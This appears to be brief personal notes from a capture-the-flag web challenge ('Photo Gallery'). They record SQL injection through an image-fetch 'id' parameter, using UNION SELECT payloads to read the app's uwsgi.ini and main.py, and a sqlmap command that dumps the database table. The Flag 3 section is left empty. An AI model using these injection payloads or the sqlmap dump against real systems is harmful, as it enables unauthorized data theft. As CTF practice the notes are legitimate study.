# Photo Gallery
## Flag 1
* http://35.227.24.107/a46a28d046/fetch?id=1 when selected image
* based on the Hint "Take a few minutes to consider the state of the union"
* A union select could be used however the location was understood after the nxext hint
* "This application runs on the uwsgi-nginx-flask-docker image" from a quick search the file loacation was dtermined.
* uwsgi.ini is the config and main.py is the main file
* Hence id=1.1 UNION SELECT 'uwsgi.ini' -- and id=1.1 UNION SELECT 'main,py' -- was tried 
* main.py had the flag.

## Flag 2
* http://35.227.24.107/a46a28d046/fetch?id=1 used with sqlmap
* sqlmap -u 35.227.24.107/a46a28d046/fetch?id=1 --dump --threads 10
* +----+------------------+--------+------------------------------------------------------------------+
  | id | title            | parent | filename                                                         |
  +----+------------------+--------+------------------------------------------------------------------+
  | 1  | Utterly adorable | 1      | files/adorable.jpg                                               |
  | 2  | Purrfect         | 1      | files/purrfect.jpg                                               |
  | 3  | Invisible        | 1      | Flag 2 |
  +----+------------------+--------+------------------------------------------------------------------+

## Flag 3
* 
